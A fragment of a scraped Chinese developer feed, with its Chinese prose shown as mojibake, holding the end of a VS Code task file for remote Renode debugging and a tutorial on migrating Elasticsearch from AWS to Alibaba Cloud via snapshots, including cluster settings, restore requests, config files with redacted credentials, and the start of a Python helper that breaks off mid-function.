        <span class="hljs-regexp">/* === 5. å…³é—­æ—§ Renode å®ä¾‹ === */</span>
        {
            <span class="hljs-string">"label"</span>: <span class="hljs-string">"Close Renode Remote"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"shell"</span>,
            <span class="hljs-string">"command"</span>: <span class="hljs-string">"ssh"</span>,
            <span class="hljs-string">"args"</span>: [
                <span class="hljs-string">"root@xxx.xxx.xxx.xxx"</span>,
                <span class="hljs-string">"pkill renode || true"</span>
            ],
            <span class="hljs-string">"problemMatcher"</span>: []
        },

        <span class="hljs-regexp">/* === 6. å¯åŠ¨ Renode Remoteï¼ˆåå°ä»»åŠ¡ï¼‰ === */</span>
        {
            <span class="hljs-string">"label"</span>: <span class="hljs-string">"Run Renode Remote"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"shell"</span>,
            <span class="hljs-string">"command"</span>: <span class="hljs-string">"ssh"</span>,
            <span class="hljs-string">"args"</span>: [
                <span class="hljs-string">"root@xxx.xxx.xxx.xxx"</span>,
                <span class="hljs-string">"/home/orangepi/object/renode_portable/renode /home/orangepi/object/renode_portable/platform.resc"</span>
            ],
            <span class="hljs-string">"dependsOn"</span>: [
                <span class="hljs-string">"Upload ELF"</span>,
                <span class="hljs-string">"Upload RESC"</span>,
                <span class="hljs-string">"Close Renode Remote"</span>
            ],
            <span class="hljs-string">"isBackground"</span>: true,

            <span class="hljs-string">"problemMatcher"</span>: {
                <span class="hljs-string">"owner"</span>: <span class="hljs-string">"Renode"</span>,
                <span class="hljs-string">"pattern"</span>: [
                    {
                        <span class="hljs-string">"regexp"</span>: <span class="hljs-string">"^(?!.*)"</span>,
                        <span class="hljs-string">"file"</span>: <span class="hljs-number">0</span>,
                        <span class="hljs-string">"line"</span>: <span class="hljs-number">0</span>,
                        <span class="hljs-string">"message"</span>: <span class="hljs-number">0</span>
                    }
                ],
                <span class="hljs-string">"background"</span>: {
                    <span class="hljs-string">"activeOnStart"</span>: true,
                    <span class="hljs-string">"beginsPattern"</span>: <span class="hljs-string">"Renode, version .*"</span>,
                    <span class="hljs-string">"endsPattern"</span>: <span class="hljs-string">".*Loaded SVD.*"</span>
                }
            }
        }
    ]
}
</code></pre>
<h3 data-id="heading-8">æµ‹è¯•</h3>
<p>ä½¿ç”¨vscodeçš„ä¸€é”®debugï¼Œå¯ä»¥çœ‹åˆ°vscodeæ­£å¸¸å’Œrenodeé€šè®¯ï¼Œæ‰“æ–­ç‚¹å’Œuartè¾“å‡ºæ­£å¸¸ï¼š</p>
<p><img src="https://pic1.zhimg.com/80/v2-5ed35b98986b2aeac89fe8df5644a40e_720w.png?source=ccfced1a" alt="img" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[1ã€Elasticsearchå¿«ç…§è¿ç§»]]></title>    <link>https://juejin.cn/post/7580988382761025551</link>    <guid>https://juejin.cn/post/7580988382761025551</guid>    <pubDate>2025-12-08T04:16:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580988382761025551" data-draft-id="7580809247736250408" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="1ã€Elasticsearchå¿«ç…§è¿ç§»"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T04:16:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸‰å§“ç å†œå¼ å‘˜å¤–"/> <meta itemprop="url" content="https://juejin.cn/user/3808364008836999"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            1ã€Elasticsearchå¿«ç…§è¿ç§»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808364008836999/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸‰å§“ç å†œå¼ å‘˜å¤–
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:16:11.000Z" title="Mon Dec 08 2025 04:16:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èƒŒæ™¯è¯´æ˜</h2>
<p>1ã€æºç«¯æ˜¯AWSã€ç›®æ ‡ç«¯æ˜¯é˜¿é‡Œäº‘<br/>
2ã€æœ€åä¸ªå‰²æ¥ç¯å¢ƒï¼Œå®¢æˆ·èƒ½æ¥å—åœæœºè¿ç§»<br/>
3ã€æºç«¯æ•°æ®é‡æ¯”è¾ƒå¤§ï¼Œå¤§æ¦‚3T</p>
<h2 data-id="heading-1">å®˜æ–¹è¿ç§»æ–‡æ¡£</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Fes%2Fuse-cases%2Fselect-a-data-migration-solution%3Fspm%3Da2c4g.11186623.help-menu-57736.d_3_1_0.416b7c67ry8Q4z%26scm%3D20140722.H_170095._.OR_help-T_cn~zh-V_1" target="_blank" title="https://help.aliyun.com/zh/es/use-cases/select-a-data-migration-solution?spm=a2c4g.11186623.help-menu-57736.d_3_1_0.416b7c67ry8Q4z&amp;scm=20140722.H_170095._.OR_help-T_cn~zh-V_1" ref="nofollow noopener noreferrer">Elasticsearchè¿ç§»æ–¹æ¡ˆé€‰å–æŒ‡å—_æ£€ç´¢åˆ†ææœåŠ¡ Elasticsearchç‰ˆ(ES)-é˜¿é‡Œäº‘å¸®åŠ©ä¸­å¿ƒ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Fes%2Fuse-cases%2Fmigrate-elasticsearch-index-data-from-amazon-opensearch-service-to-alibaba-cloud-elasticsearch%23section-vsd-f3p-fhb" target="_blank" title="https://help.aliyun.com/zh/es/use-cases/migrate-elasticsearch-index-data-from-amazon-opensearch-service-to-alibaba-cloud-elasticsearch#section-vsd-f3p-fhb" ref="nofollow noopener noreferrer">å°†AWSä¸­çš„ESæ•°æ®è¿ç§»åˆ°é˜¿é‡Œäº‘ESä¸­_æ£€ç´¢åˆ†ææœåŠ¡ Elasticsearchç‰ˆ(ES)-é˜¿é‡Œäº‘å¸®åŠ©ä¸­å¿ƒ</a></p>
<h2 data-id="heading-2">ESè¿ç§»æ•´ä½“æµç¨‹</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca8f596a36814096af5217cd6edee404~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ5aeT56CB5Yac5byg5ZGY5aSW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772513&amp;x-signature=ymPTIJ0vCZz65cXL1SJaJ1f5x%2Fg%3D" alt="ESå¿«ç…§è¿ç§»é—®é¢˜.png" loading="lazy"/></p>
<h2 data-id="heading-3">ä¼˜åŒ–ç›®æ ‡ç«¯ESé…ç½®é¡¹</h2>
<p>ä¿®æ”¹ä¸‹é¢çš„é…ç½®å¯ä»¥æœ‰æ•ˆåŠ é€Ÿå¿«ç…§æ¢å¤çš„é€Ÿåº¦ã€‚</p>
<h4 data-id="heading-4">å¢åŠ æ¢å¤å¸¦å®½</h4>
<pre><code class="hljs language-bash" lang="bash">PUT /_cluster/settings
{
    <span class="hljs-string">"transient"</span>: {
        <span class="hljs-string">"indices.recovery.max_bytes_per_sec"</span>: <span class="hljs-string">"300mb"</span>
    }
}
GET /_cluster/settings?include_defaults=<span class="hljs-literal">true</span>&amp;flat_settings=<span class="hljs-literal">true</span>
</code></pre>
<p>1ã€é™åˆ¶æ¢å¤å¸¦å®½: å°† indices.recovery.max_bytes_per_sec å‚æ•°è®¾ç½®ä¸º 300mbï¼ˆé»˜è®¤æ˜¯40mbï¼‰</p>
<p>2ã€ä¸´æ—¶ç”Ÿæ•ˆ: ä½¿ç”¨ transient é…ç½®ï¼Œé‡å¯åå¤±æ•ˆ</p>
<p>3ã€å½±å“èŒƒå›´: æ§åˆ¶åˆ†ç‰‡æ¢å¤ã€é‡æ–°å¹³è¡¡ç­‰æ“ä½œçš„ç½‘ç»œä¼ è¾“é€Ÿåº¦</p>
<h4 data-id="heading-5">è°ƒæ•´é›†ç¾¤åˆ†ç‰‡åˆ†é…å¹¶å‘åº¦: é…ç½® Elasticsearch é›†ç¾¤ä¸­åˆ†ç‰‡æ¢å¤å’Œåˆ†é…çš„å¹¶å‘æ•°é‡</h4>
<p>é»˜è®¤å€¼æ˜¯4</p>
<pre><code class="hljs language-bash" lang="bash">PUT _cluster/settings
{
  <span class="hljs-string">"persistent"</span>: {
    <span class="hljs-string">"cluster.routing.allocation.node_concurrent_recoveries"</span> : <span class="hljs-string">"16"</span>,
    <span class="hljs-string">"cluster.routing.allocation.node_initial_primaries_recoveries"</span> : <span class="hljs-string">"16"</span>
  }
}
</code></pre>
<p>cluster.routing.allocation.node_concurrent_recoveries:</p>
<ul>
<li>è®¾ç½®æ¯ä¸ªèŠ‚ç‚¹ä¸ŠåŒæ—¶è¿›è¡Œçš„åˆ†ç‰‡æ¢å¤æ“ä½œæ•°é‡ä¸º 16</li>
<li>å½±å“é›†ç¾¤é‡æ–°å¹³è¡¡ã€èŠ‚ç‚¹é‡å¯åçš„æ•°æ®æ¢å¤é€Ÿåº¦</li>
</ul>
<p>cluster.routing.allocation.node_initial_primaries_recoveries:</p>
<ul>
<li>è®¾ç½®æ¯ä¸ªèŠ‚ç‚¹ä¸ŠåŒæ—¶è¿›è¡Œçš„ä¸»åˆ†ç‰‡åˆå§‹æ¢å¤æ“ä½œæ•°é‡ä¸º 16</li>
<li>ä¸»è¦å½±å“æ–°ç´¢å¼•åˆ›å»ºæˆ–é›†ç¾¤å¯åŠ¨æ—¶çš„ä¸»åˆ†ç‰‡åˆ†é…é€Ÿåº¦</li>
</ul>
<p>é…ç½®ç‰¹ç‚¹</p>
<ul>
<li>æŒä¹…åŒ–è®¾ç½®: ä½¿ç”¨ persistent é…ç½®ï¼Œé‡å¯åä»ç„¶æœ‰æ•ˆ</li>
<li>æ€§èƒ½ä¼˜åŒ–: å¢åŠ å¹¶å‘åº¦å¯ä»¥åŠ å¿«é›†ç¾¤æ¢å¤å’Œé‡æ–°å¹³è¡¡é€Ÿåº¦</li>
<li>èµ„æºç®¡ç†: éœ€è¦æ ¹æ®èŠ‚ç‚¹ç¡¬ä»¶èµ„æºåˆç†è®¾ç½®ï¼Œé¿å…è¿‡åº¦æ¶ˆè€—ç³»ç»Ÿèµ„æº</li>
</ul>
<p>é€‚ç”¨åœºæ™¯</p>
<ul>
<li>é›†ç¾¤æ‰©å®¹æˆ–ç¼©å®¹æ—¶åŠ é€Ÿåˆ†ç‰‡é‡æ–°åˆ†é…</li>
<li>èŠ‚ç‚¹ç»´æŠ¤åå¿«é€Ÿæ¢å¤æœåŠ¡</li>
<li>å¤§è§„æ¨¡æ•°æ®è¿ç§»æ—¶æé«˜æ•ˆç‡</li>
</ul>
<h2 data-id="heading-6">æ€»ç»“çš„è¿ç§»æ­¥éª¤</h2>
<h4 data-id="heading-7">ç¬¬ä¸€æ¬¡å¿«ç…§æ¢å¤åŠ¨ä½œ</h4>
<p>1ã€åœ¨AWSä¸Šçš„esåˆ›å»ºå¿«ç…§å¹¶ä¸Šä¼ åˆ°S3</p>
<pre><code class="hljs language-bash" lang="bash">GET _snapshot
<span class="hljs-comment"># åˆ›å»ºä»“åº“</span>
PUT _snapshot/ali_backup
{
  <span class="hljs-string">"type"</span>: <span class="hljs-string">"s3"</span>,
  <span class="hljs-string">"settings"</span>: {
    <span class="hljs-string">"bucket"</span>: <span class="hljs-string">"AWSäº‘S3æ¡¶åç§°"</span>,
    <span class="hljs-string">"base_path"</span>: <span class="hljs-string">"æ¡¶ä¸‹é¢çš„è·¯å¾„"</span>,
    <span class="hljs-string">"region"</span>: <span class="hljs-string">"cn-north-1"</span>,
    <span class="hljs-string">"endpoint"</span>: <span class="hljs-string">"s3.cn-north-1.amazonaws.com.cn"</span>
  }
}
<span class="hljs-comment"># ç¬¬ä¸€ä¸ªç‰ˆæœ¬å¿«ç…§</span>
PUT _snapshot/ali_backup/prd_01
{
  <span class="hljs-string">"indices"</span>: <span class="hljs-string">"*"</span>,
  <span class="hljs-string">"ignore_unavailable"</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-string">"include_global_state"</span>: <span class="hljs-literal">false</span>
}
<span class="hljs-comment"># æŸ¥çœ‹å¿«ç…§è¿›åº¦</span>
GET _cat/snapshots/ali_backup?v
</code></pre>
<p>2ã€å¯åŠ¨S3åˆ°ossçš„æ•°æ®åŒæ­¥ä»»åŠ¡ï¼šç»è¿‡ä¸Šé¢çš„æ­¥éª¤AWSçš„esæ•°æ®å·²ç»åŒæ­¥åˆ°S3ï¼Œé…ç½®æ•°æ®åŒæ­¥å°†S3æ•°æ®åŒæ­¥åˆ°é˜¿é‡Œäº‘OSSå¹¶è§‚å¯Ÿæ•°æ®åŒæ­¥ç»“æœ</p>
<p>3ã€åœ¨é˜¿é‡Œäº‘ESä¸Šæ¢å¤å¿«ç…§</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ›´æ–°ä»“åº“</span>
PUT _snapshot/ali_backup
{
<span class="hljs-string">"type"</span>: <span class="hljs-string">"oss"</span>,
<span class="hljs-string">"settings"</span>: {
            <span class="hljs-string">"base_path"</span>: <span class="hljs-string">"æ¡¶ä¸‹é¢çš„è·¯å¾„"</span>,
            <span class="hljs-string">"endpoint"</span>: <span class="hljs-string">"http://oss-cn-beijing-internal.aliyuncs.com"</span>, 
            <span class="hljs-string">"access_key_id"</span>: <span class="hljs-string">"*************"</span>,
            <span class="hljs-string">"secret_access_key"</span>: <span class="hljs-string">"*************"</span>,
            <span class="hljs-string">"bucket"</span>: <span class="hljs-string">"ossæ¡¶"</span>,
            <span class="hljs-string">"compress"</span>: <span class="hljs-literal">true</span>
      }
}

<span class="hljs-comment"># æŸ¥çœ‹å¿«ç…§</span>
GET _snapshot/ali_backup/prd_01

<span class="hljs-comment"># å…¨é‡æ¢å¤å¿«ç…§ï¼ˆæ’é™¤ç³»ç»Ÿç´¢å¼•ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ç¬¬ä¸€æ¬¡æ¢å¤æ‰€ä»¥ä¸éœ€è¦å…³é—­ç´¢å¼•ï¼‰</span>
POST _snapshot/ali_backup/prd_01/_restore
{
    <span class="hljs-string">"indices"</span>: <span class="hljs-string">"*,-.*,-system*,-ilm*,-kibana*,-.kibana*"</span>
}
<span class="hljs-comment"># * æ¢å¤é•œåƒä¸­çš„æ‰€æœ‰ç´¢å¼•</span>
<span class="hljs-comment"># -.*  æ’é™¤ç³»ç»Ÿç´¢å¼•</span>
<span class="hljs-comment"># -system*  </span>
<span class="hljs-comment"># -ilm* æ’é™¤ILMç´¢å¼•</span>
<span class="hljs-comment"># -kibana*,-.kibana*  æ’é™¤kibanaç´¢å¼•</span>
</code></pre>
<h4 data-id="heading-8">ç¬¬äºŒæ¬¡å¿«ç…§æ¢å¤åŠ¨ä½œ</h4>
<p>1ã€åœ¨AWSä¸Šçš„esåˆ›å»ºå¿«ç…§å¹¶ä¸Šä¼ åˆ°S3ï¼Œç¬¬2ä¸ªç‰ˆæœ¬prd_02</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¬¬2ä¸ªç‰ˆæœ¬å¿«ç…§</span>
PUT _snapshot/ali_backup/prd_02
{
  <span class="hljs-string">"indices"</span>: <span class="hljs-string">"*"</span>,
  <span class="hljs-string">"ignore_unavailable"</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-string">"include_global_state"</span>: <span class="hljs-literal">false</span>
}
<span class="hljs-comment"># æŸ¥çœ‹å¿«ç…§è¿›åº¦</span>
GET _cat/snapshots/ali_backup?v
</code></pre>
<p>2ã€å¯åŠ¨S3åˆ°ossçš„æ•°æ®åŒæ­¥ä»»åŠ¡</p>
<p>3ã€åœ¨é˜¿é‡Œäº‘ESä¸Šæ¢å¤å¿«ç…§</p>
<pre><code class="hljs language-bash" lang="bash">
<span class="hljs-comment"># æŸ¥çœ‹å¿«ç…§</span>
GET _snapshot/ali_backup/prd_02

<span class="hljs-comment"># å…³é—­æ‰€æœ‰ç´¢å¼•ä¸»è¦è¦æ’é™¤ç³»ç»Ÿç´¢å¼•ï¼Œä¸ç„¶kibanaä¼šæŠ¥é”™å°±æ²¡æ³•æ“ä½œäº†</span>
POST /*,-.*,-system*,-ilm*,-kibana*,-.kibana*/_close

<span class="hljs-comment"># å…¨é‡æ¢å¤å¿«ç…§æ’é™¤ç³»ç»Ÿç´¢å¼•</span>
POST _snapshot/ali_backup/prd_02/_restore
{
    <span class="hljs-string">"indices"</span>: <span class="hljs-string">"*,-.*,-system*,-ilm*,-kibana*,-.kibana*"</span>
}
</code></pre>
<h4 data-id="heading-9">æ€»ç»“è¯´æ˜</h4>
<p>å¿«ç…§æ¢å¤æ¯”è¾ƒç®€å•é«˜æ•ˆï¼Œå½“æ®é‡å¤§çš„æƒ…å†µä¸‹ç¬¬ä¸€æ¬¡æ‰“å¿«ç…§å’Œæ¢å¤å¿«ç…§æ—¶é—´è¾ƒé•¿ï¼Œåé¢åšå¢é‡å¿«ç…§å’Œæ¢å¤å¢é‡å¿«ç…§æ¯”è¾ƒå¿«ã€‚</p>
<h2 data-id="heading-10">esç”Ÿæˆå¿«ç…§è„šæœ¬</h2>
<p>ä¸‹é¢æ˜¯åŸºäºpythonå¼€å‘çš„ç”Ÿæˆå¿«ç…§ã€å…³é—­ç´¢å¼•ã€æ¢å¤ç´¢å¼•ã€æ‰“å¼€ç´¢å¼•ã€æŸ¥çœ‹æ¢å¤çŠ¶æ€ã€æŸ¥çœ‹ç´¢å¼•ç‰ˆæœ¬çš„å·¥å…·ï¼Œæ–¹ä¾¿è¿›è¡Œå¤šæ¬¡æ‰“å¿«ç…§æ¢å¤å¿«ç…§é¿å…åœ¨kibanaä¸Šé¢‘ç¹æ“ä½œè¯¯æ“ä½œã€‚</p>
<p>es_ba_config.toml</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[AWS-es01]</span>
<span class="hljs-attr">es_host</span> = <span class="hljs-string">"xxxxx.ssss.net.cn"</span>
<span class="hljs-attr">es_port</span> = <span class="hljs-number">9200</span>
<span class="hljs-attr">protocol</span> = <span class="hljs-string">"https"</span>
<span class="hljs-attr">username</span> = <span class="hljs-string">"elastic"</span>  <span class="hljs-comment"># ç”¨æˆ·å</span>
<span class="hljs-attr">password</span> = <span class="hljs-string">"xxxxxxxxxxxxxx"</span>  <span class="hljs-comment"># å¯†ç </span>

<span class="hljs-section">[AWS-es02]</span>
<span class="hljs-attr">es_host</span> = <span class="hljs-string">"xxxxx.ssss.cn"</span>
<span class="hljs-attr">es_port</span> = <span class="hljs-number">9200</span>
<span class="hljs-attr">protocol</span> = <span class="hljs-string">"https"</span>
<span class="hljs-attr">username</span> = <span class="hljs-string">"elastic"</span>  <span class="hljs-comment"># ç”¨æˆ·å</span>
<span class="hljs-attr">password</span> = <span class="hljs-string">"XXXXXXXXP"</span>  <span class="hljs-comment"># å¯†ç </span>
</code></pre>
<p>es_re_config.toml</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[ALI-es-01]</span>
<span class="hljs-attr">es_host</span> = <span class="hljs-string">"XXXXXXXXXXXXXXXXXXXXXXXXxx.aliyuncs.com"</span>
<span class="hljs-attr">es_port</span> = <span class="hljs-number">9200</span>
<span class="hljs-attr">protocol</span> = <span class="hljs-string">"https"</span>
<span class="hljs-attr">username</span> = <span class="hljs-string">"elastic"</span>  <span class="hljs-comment"># ç”¨æˆ·å</span>
<span class="hljs-attr">password</span> = <span class="hljs-string">"XXXXXXXXX"</span>  <span class="hljs-comment"># å¯†ç </span>

<span class="hljs-section">[ALI-es-02]</span>
<span class="hljs-attr">es_host</span> = <span class="hljs-string">"XXXXXXXXXXXXXXXXXXXXXXXXxx.aliyuncs.com"</span>
<span class="hljs-attr">es_port</span> = <span class="hljs-number">9200</span>
<span class="hljs-attr">protocol</span> = <span class="hljs-string">"https"</span>
<span class="hljs-attr">username</span> = <span class="hljs-string">"elastic"</span>  <span class="hljs-comment"># ç”¨æˆ·å</span>
<span class="hljs-attr">password</span> = <span class="hljs-string">"XXXXXXXXX"</span>  <span class="hljs-comment"># å¯†ç </span>
</code></pre>
<p>es-backup.py</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> toml
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, jsonify, request
app = Flask(__name__)

<span class="hljs-comment">#----------------------------åŠ è½½é…ç½®æ–‡ä»¶---------------------------#</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">set_config</span>(<span class="hljs-params">config_name</span>):
    <span class="hljs-string">"""
    è·å–é…ç½®ä¿¡æ¯å¹¶è®¾ç½®å…¨å±€å˜é‡
    """</span>
    <span class="hljs-keyword">global</span> ES_HOST, ES_PORT, PROTOCOL, USERNAME, PASSWORD

    <span class="hljs-keyword">try</span>:
        file_path = <span class="hljs-string">r"D:\work\es_ba_config.toml"</span>
        config = toml.load(file_path)[config_name]

        <span class="hljs-comment"># è®¾ç½®å…¨å±€å˜é‡</span>
        ES_HOST = config.get(<span class="hljs-string">'es_host'</span>)
        ES_PORT = config.get(<span class="hljs-string">'es_port'</span>)
        PROTOCOL = config.get(<span class="hljs-string">'protocol'</span>)
        USERNAME = config.get(<span class="hljs-string">'username'</span>)
        PASSWORD = config.get(<span class="hljs-string">'password'</span>)

        <span class="hljs-built_in">print</span>({
            <span class="hljs-string">'ES_HOST'</span>: ES_HOST,
            <span class="hljs-string">'ES_PORT'</span>: ES_PORT,
            <span class="hljs-string">'PROTOCOL'</span>: PROTOCOL,
            <span class="hljs-string">'USERNAME'</span>: USERNAME,
            <span class="hljs-string">'PASSWORD'</span>: PASSWORD
        })
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"åŠ è½½é…ç½®å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
<span class="hljs-comment">#----------------------------åŠ è½½é…ç½®æ–‡ä»¶---------------------------#</span>

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/api/get_snapshot_status'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">api_get_snapshot_status</span>():
    <span class="hljs-string">"""
    APIæ¥å£ï¼šè·å–å¿«ç…§çŠ¶æ€
    æ‰§è¡Œå‘½ä»¤: GET _cat/snapshots/plrs_target_ps_visit_precondition?v
    """</span>
    data = request.get_json()
    repository = data.get(<span class="hljs-string">'repository'</span>)
    config_name = data.get(<span class="hljs-string">'config_name'</span>)
    set_config(config_name)
    <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
    url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/_cat/snapshots/<span class="hljs-subst">{repository}</span>?v"</span>

    <span class="hljs-comment"># è®¾ç½®è¯·æ±‚å‚æ•°</span>
    params = {
        <span class="hljs-string">'v'</span>: <span class="hljs-string">'true'</span>  <span class="hljs-comment"># æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</span>
    }

    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
